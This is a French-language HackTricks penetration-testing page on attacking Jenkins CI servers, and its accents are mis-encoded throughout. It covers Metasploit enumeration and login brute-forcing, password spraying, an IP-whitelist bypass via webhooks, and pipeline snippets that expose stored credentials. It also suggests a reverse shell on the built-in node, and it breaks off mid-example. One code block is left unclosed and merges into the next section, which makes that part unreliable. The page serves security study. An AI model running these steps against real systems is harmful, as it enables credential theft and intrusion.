# S√©curit√© de Jenkins

<details>

<summary><strong>Soutenez HackTricks et b√©n√©ficiez d'avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection d'exclusivit√©s [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Informations de base

Jenkins offre un moyen simple de configurer un environnement de **continuous integration** ou de **continuous delivery** (CI/CD) pour presque **n'importe quelle** combinaison de **langages** et de r√©f√©rentiels de code source en utilisant des pipelines, ainsi que d'automatiser d'autres t√¢ches de d√©veloppement courantes. Bien que Jenkins n'√©limine pas la **n√©cessit√© de cr√©er des scripts pour des √©tapes individuelles**, il vous donne un moyen plus rapide et plus robuste d'int√©grer l'ensemble de votre cha√Æne d'outils de construction, de test et de d√©ploiement que vous pouvez facilement construire vous-m√™me.\
D√©finition de [ici](https://www.infoworld.com/article/3239666/what-is-jenkins-the-ci-server-explained.html).

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## √ânum√©ration non authentifi√©e

Pour rechercher des pages Jenkins int√©ressantes sans authentification comme (_/people_ ou _/asynchPeople_, cela liste les utilisateurs actuels), vous pouvez utiliser :

```
msf> use auxiliary/scanner/http/jenkins_enum
```

V√©rifiez si vous pouvez ex√©cuter des commandes sans avoir besoin d'authentification :

```
msf> use auxiliary/scanner/http/jenkins_command
```

Sans identifiants, vous pouvez regarder √† l'int√©rieur du chemin _**/asynchPeople/**_ ou _**/securityRealm/user/admin/search/index?q=**_ pour les **noms d'utilisateur**.

Vous pouvez √™tre en mesure d'obtenir la version de Jenkins √† partir du chemin _**/oops**_ ou _**/error**_

![](<../../.gitbook/assets/image (48).png>)

### Vuln√©rabilit√©s connues

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## Connexion

Dans les informations de base, vous pouvez v√©rifier **toutes les fa√ßons de vous connecter √† Jenkins** :

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### S'inscrire

Vous pourrez trouver des instances Jenkins qui **vous permettent de cr√©er un compte et de vous connecter √† l'int√©rieur**. Aussi simple que cela.

### Connexion SSO

Si la fonctionnalit√©/les plugins **SSO** √©taient pr√©sents, vous devriez essayer de **vous connecter** √† l'application en utilisant un compte de test (c'est-√†-dire un compte **Github/Bitbucket de test**). Astuce de [**ici**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/).

### Brute-force

**Jekins** n'impl√©mente pas de **politique de mot de passe** ou de **mitigation de la force brute de nom d'utilisateur**. Par cons√©quent, vous devriez toujours essayer de **forcer les utilisateurs** car probablement des **mots de passe faibles** sont utilis√©s (m√™me des **noms d'utilisateur comme mots de passe** ou des **noms d'utilisateur invers√©s comme mots de passe**).

```
msf> use auxiliary/scanner/http/jenkins_login
```

### Password spraying

Utilisez [ce script python](https://github.com/gquere/pwn\_jenkins/blob/master/password\_spraying/jenkins\_password\_spraying.py) ou [ce script powershell](https://github.com/chryzsh/JenkinsPasswordSpray).

### Contournement de la liste blanche IP

De nombreuses organisations combinent des **syst√®mes de gestion de contr√¥le de source (SCM) bas√©s sur SaaS** (comme GitHub ou GitLab) avec une solution **CI** auto-h√©berg√©e (par exemple Jenkins, TeamCity) leur permettant de **recevoir des √©v√©nements webhook** des fournisseurs de contr√¥le de source SaaS, dans le simple but de d√©clencher des travaux de pipeline.

Par cons√©quent, les organisations **mettent sur liste blanche** les **plages d'adresses IP** du **SCM** en leur permettant d'atteindre le syst√®me CI **interne avec des webhooks**. Cependant, notez comment **n'importe qui** peut cr√©er un **compte** dans Github ou Gitlab et le faire **d√©clencher un webhook** qui pourrait envoyer une demande √† ce **syst√®me CI interne**.

{% content-ref url="scm-ip-whitelisting-bypass.md" %}
[scm-ip-whitelisting-bypass.md](scm-ip-whitelisting-bypass.md)
{% endcontent-ref %}

## Abus internes de Jenkins

Dans ces sc√©narios, nous allons supposer que vous avez un compte valide pour acc√©der √† Jenkins.

{% hint style="warning" %}
En fonction du m√©canisme d'**autorisation** configur√© dans Jenkins et des autorisations de l'utilisateur compromis, vous **pourriez √™tre en mesure ou non d'effectuer les attaques suivantes**.
{% endhint %}

Pour plus d'informations, consultez les informations de base :

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Liste des utilisateurs

Si vous avez acc√©d√© √† Jenkins, vous pouvez lister les autres utilisateurs enregistr√©s dans [http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)

### Dumping builds pour trouver des secrets en clair

Utilisez [ce script](https://github.com/gquere/pwn\_jenkins/blob/master/dump\_builds/jenkins\_dump\_builds.py) pour extraire les sorties de console de construction et les variables d'environnement de construction pour trouver des secrets en clair.

```bash
python3 jenkins_dump_builds.py -u alice
### V√©rification des variables d'environnement

Il est possible de d√©clarer des **variables d'environnement en texte clair** pour l'ensemble du pipeline ou pour des √©tapes sp√©cifiques. Ces variables d'environnement **ne devraient pas contenir d'informations sensibles**, mais un attaquant pourrait toujours **v√©rifier toutes les configurations du pipeline**/Jenkinsfiles :

```bash
pipeline {
    agent {label 'built-in'}
    environment {
        GENERIC_ENV_VAR = "Test pipeline ENV variables."
    }

    stages {
        stage("Build") {
                environment {
                    STAGE_ENV_VAR = "Test stage ENV variables."
                }
                steps {
```

### Extraction de secrets

Pour des informations sur la fa√ßon dont les secrets sont g√©n√©ralement trait√©s par Jenkins, consultez les informations de base :

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

Les informations d'identification peuvent √™tre **limit√©es aux fournisseurs globaux** (`/credentials/`) ou √† des **projets sp√©cifiques** (`/job/<nom-du-projet>/configure`). Par cons√©quent, pour exfiltrer tous les secrets, vous devez **compromettre au moins tous les projets** qui contiennent des secrets et ex√©cuter des pipelines personnalis√©s/empoisonn√©s.

Il y a un autre probl√®me, pour obtenir un **secret dans l'environnement** d'un pipeline, vous devez **conna√Ætre le nom et le type du secret**. Par exemple, si vous essayez de **charger** un **secret `usernamePassword`** en tant que **secret `string`**, vous obtiendrez cette **erreur** :

```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```

Voici la fa√ßon de charger certains types de secrets courants :

```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
    sh '''
        env #Recherche de USERNAME et PASS
    '''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
    sh '''
        env #Recherche de SECRET
    '''                 
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
    sh '''
        env # Recherche de USERPASS
    '''
}

# Vous pouvez √©galement charger plusieurs variables d'environnement en une seule fois
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
                 string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
     sh '''
        env
    '''
}
```

√Ä la fin de cette page, vous pouvez **trouver tous les types d'informations d'identification** : [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
La meilleure fa√ßon de **dumper tous les secrets en une seule fois** est de **compromettre** la **machine Jenkins** (en ex√©cutant un shell invers√© dans le **n≈ìud int√©gr√©** par exemple) et ensuite **de divulguer** les **cl√©s ma√Ætres** et les **secrets chiffr√©s** et de les d√©crypter hors ligne.\
Plus d'informations sur la fa√ßon de faire cela dans la section [Nodes & Agents](./#nodes-and-agents) et dans la section [Post Exploitation](./#post-exploitation).
{% endhint %}

### D√©clencheurs

√Ä partir de [la documentation](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers) : La directive `triggers` d√©finit les **moyens automatis√©s par lesquels le pipeline doit √™tre relanc√©**. Pour les pipelines int√©gr√©s √† une source telle que GitHub ou BitBucket, les int√©grations bas√©es sur les webhooks ne seront probablement pas n√©cessaires car elles seront d√©j√† pr√©sentes. Les d√©clencheurs actuellement disponibles sont `cron`, `pollSCM` et `upstream`.

Exemple de cron :

```bash
triggers { cron('H */4 * * 1-5') }
```

Consultez **d'autres exemples dans la documentation**.

### Nodes & Agents

Une **instance de Jenkins** peut avoir **diff√©rents agents s'ex√©cutant sur diff√©rentes machines**. Du point de vue d'un attaquant, l'acc√®s √† diff√©rentes machines signifie **diff√©rentes informations d'identification cloud potentielles** √† voler ou **diff√©rents acc√®s r√©seau** qui pourraient √™tre utilis√©s pour exploiter d'autres machines.

Pour plus d'informations, consultez les informations de base :

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

Vous pouvez √©num√©rer les **n≈ìuds configur√©s** dans `/computer/`, vous trouverez g√©n√©ralement le **`n≈ìud int√©gr√©`** (qui est le n≈ìud ex√©cutant Jenkins) et potentiellement plus :

![](<../../.gitbook/assets/image (25).png>)

Il est **particuli√®rement int√©ressant de compromettre le n≈ìud int√©gr√©** car il contient des informations sensibles sur Jenkins.

Pour indiquer que vous voulez **ex√©cuter** le **pipeline** dans le **n≈ìud Jenkins int√©gr√©**, vous pouvez sp√©cifier √† l'int√©rieur du pipeline la configuration suivante :

```bash
pipeline {
    agent {label 'built-in'}
```

### Exemple complet

Pipeline dans un agent sp√©cifique, avec un d√©clencheur cron, avec des variables d'environnement de pipeline et d'√©tape, chargement de 2 variables dans une √©tape et envoi d'un shell invers√© :

```bash
pipeline {
    agent {label 'built-in'}
    triggers { cron('H */4 * * 1-5') }
    environment {
        GENERIC_ENV_VAR =